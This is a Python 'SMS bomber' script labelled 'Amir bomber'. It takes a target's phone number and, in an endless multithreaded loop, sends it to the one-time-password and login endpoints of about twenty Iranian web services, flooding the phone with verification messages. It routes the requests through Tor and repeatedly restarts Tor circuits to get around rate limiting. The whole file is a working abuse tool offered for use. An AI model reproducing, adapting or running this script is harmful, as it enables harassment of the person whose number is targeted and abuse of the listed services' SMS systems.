import requests
from time import sleep
import random
from threading import Thread
import os
send = 0
os.system("pyfiglet Amir bomber | lolcat -a -d 25")
os.system('echo rubika:@ilucode | lolcat')
phone =input("inter your phone : ")
proxy = {"socks5": "127.0.0.1:9150"}
def shah(phone):
	urlc = "https://shahrfarsh.com/Account/Login"
	
	pyc ={"phoneNumber":"0"+phone}
	try:
		reqb = requests.post(urlc,data=pyc,proxies=proxy)
	except:
		print("eror")

def aggh(phone):
	urlf = "https://mrestate.ir/api/profile/v1/login_signup/"
	pyf = {"phone_number":phone,"access_level":"1"}
	try:
		rea = requests.post(urlf,data=pyf,proxies=proxy)
		send +=1
		print(send)
	except:
		print("eror")
def digi(phone):
	d = "https://api.digikalajet.ir/user/login-register/"
	p = {"phone":"0"+phone}
	try:
		i = requests.post(d , data = p,proxies=proxy)
	except:
		print("eror")
#digi.tamom
def esa(phone):
	em = "https://api.esam.ir/api/account/RegisterOrLogin"
	pm = {
    "mobile": phone,
    "uidtr": 637960871238769386,
    "uid": 2986544,
    "username": "t96bj551",
    "condition": 0
	}
	try:
		mm = requests.post(em , data=pm,proxies=proxy)
	except:
		print("eror")
	

def roj(phone):
	r2 = "https://rojashop.com/api/auth/sendOtp"
	o2 = {'mobile':'0'+phone}
	try:
		re2 = requests.post(r2 , data=o2,proxies=proxy)
	except:
		print("eror")
	
def sam(phone):
	try:
		sam3= requests.post(f'https://api.snapp.market/mart/v1/user/loginMobileWithNoPass?cellphone={"0"+phone}&platform=PWA')
	except:
		print("eror")
	
def timc(phone):
	tm4 = "https://api.timcheh.com/auth/otp/send"
	p4 = {"mobile":"0"+phone}
	try:
		re4 = requests.post(tm4 , data = p4,proxies=proxy)
	except:
		print("eror")

def khod(phone):
	kh5 = "https://khodro45.com/api/v1/customers/otp/"
	p5 ={"mobile":"0"+phone}
	try:
		re5 = requests.post(kh5 , data=p5,proxies=proxy)
	except:
		print("eror")
	
def deli(phone):
	de6 = "https://www.delino.com/user/register"
	p6={"mobile":"0"+phone}
	try:
		re6 = requests.post(de6 , data=p6,proxies=proxy)
	except:
		print("eror")
	
def zod(phone):
	zo7 = "https://admin.zoodex.ir/api/v1/check-mobile"
	p7 = {"mobile":"0"+phone}
	try:
		re7 = requests.post(zo7 , data = p7,proxies=proxy)
	except:
		print("eror")
	
def orki(phone):
	or8 = "https://orders.orkidehrestaurant.com/api/users/send/otp"
	p8 = {"mobile":"0"+phone,"i_am_worker":0,"i_am_market_manager":0}
	try:
		re8 = requests.post(or8 , data=p8,proxies=proxy)
	except:
		print("eror")
def seko(phone):
	se10 ="https://sekonj.design/api/signin/"
	p10 = {"mobile":"0"+phone}
	try:
		re10 = requests.post(se10 , data = p10,proxies=proxy)
	except:
		print("eror")
def yab(phone):
	y11 = "https://m.payaneh.ir/api/code/send"
	p11 = {"phone":"0"+phone}
	try:
		re11 = requests.post(y11 , data=p11,proxies=proxy)
	except:
		print("eror")
def dec(phone):
	de12 ="https://www.offdecor.com/index.php?route=account/login/sendCode"
	p12 ={"phone":"0"+phone}
	try:
		req=requests.post(de12,data=p12,proxies=proxy)
	except:
		print("eror")

def sha(phone):
	s13 = "https://api.shabesh.com/api/checknumber"
	p13 = {"mobile":"0"+phone}
	try:
		re3q = requests.post(s13 , data= p13,proxies=proxy)
	except:
		print("eror")
def faf(phone):
	f14 = "https://api2.fafait.net/oauth/check-user"
	p14 = {"id":"0"+phone}
	try:
		re14 = requests.post(f14 , data= p14,proxies=proxy)
	except:
		print("eror")
def kha(phone):
	k15 = "https://khajikala.ir/Login/check"
	p15 = {"mob":"0"+phone}
	try:
		re15 = requests.post(k15 , data= p15,proxies=proxy)
	except:
		print("eror")
def beh(phone):
	b16 = "https://api.behtarino.com/api/v1/businesses/lqfbvhcgvy/vitrin_verification/"
	p16 = {"phone":"0"+phone,"resend":"true"}
	try:
		re16 = requests.post(b16 , data= p16,proxies=proxy)
	except:
		print("eror")
def bah(phone):
	b17 = "https://api.behtarino.com/api/v1/businesses/lqfbvhcgvy/vitrin_verification/"
	p17 = {"phone":"0"+phone}
	try:
		re17 = requests.post(b17 , data= p17,proxies=proxy)
	except:
		print("eror")
def sna(phone):
	s18 = "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp"
	p18 = {"cellphone":"+98"+phone}
	try:
		re18 = requests.post(s18 , data= p18,proxies=proxy)
	except:
		print("eror")
def saf(phone):
	s19 = "https://snappfood.ir/mobile/v4/user/loginMobileWithNoPass?client=PWA&optionalClient=PWA&deviceType=PWA&appVersion=5.6.6&optionalVersion=5.6.6&UDID=fa9e9632-68e1-49c0-89d5-6a92614cb051"
	p19 = {"cellphone":"+98"+phone}
	try:
		re19 = requests.post(s19 , data= p19,proxies=proxy)
	except:
		print("eror")
def oof(phone):
		ur = "https://api.offch.com/auth/otp"
		p = {"username": "0"+phone}
		try:
			req = requests.post(ur,data=p,proxies=proxy)
		except:
			print("eror")
			


while True:
		Thread(target=shah, args=[phone]).start()
		Thread(target=digi, args=[phone]).start()
		Thread(target=esa, args=[phone]).start()
		Thread(target=roj, args=[phone]).start()
		Thread(target=sam, args=[phone]).start()
		Thread(target=timc, args=[phone]).start()
		Thread(target=khod, args=[phone]).start()
		Thread(target=deli, args=[phone]).start()
		Thread(target=zod, args=[phone]).start()
		Thread(target=orki, args=[phone]).start()
		os.system("killall -HUP tor")
		Thread(target=seko, args=[phone]).start()
		Thread(target=yab, args=[phone]).start()
		Thread(target=dec, args=[phone]).start()
		Thread(target=sha, args=[phone]).start()
		Thread(target=faf, args=[phone]).start()
		Thread(target=kha, args=[phone]).start()
		Thread(target=beh, args=[phone]).start()
		Thread(target=bah, args=[phone]).start()
		Thread(target=sna, args=[phone]).start()
		os.system("killall -HUP tor")
		Thread(target=saf, args=[phone]).start()
		Thread(target=oof, args=[phone]).start()
		Thread(target=aggh, args=[phone]).start()


	


	